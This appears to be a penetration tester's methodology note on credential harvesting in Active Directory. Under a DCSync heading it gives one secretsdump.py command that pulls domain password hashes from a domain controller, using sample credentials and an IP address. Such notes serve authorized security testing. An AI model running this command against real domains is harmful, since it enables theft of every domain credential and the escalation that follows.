---
created: 2026-10-04
updated: 2026-10-08
---
## Credential harvesting

>[!abstract] Credential harvesting collects secrets already present in the environment — passwords and keys left in file shares, scripts, and `SYSVOL`, and hashes extracted from compromised hosts and the directory itself. Each recovered credential feeds the reuse and escalation techniques across the rest of this methodology.

>[!info] This sub-root shortlists the most essential commands per source. Follow the linked note for the full methodology, tooling, and options.



## Extracting hashes from the directory

>[!note] See [[🛠️ DCSync]].

- With replication rights, pull domain password hashes by impersonating a DC:

```bash
secretsdump.py -just-dc domain.local/jdoe:'passwd123'@10.10.11.5
```

>[!note] See [[🛠️ AD testing methodology#ACL attacks]].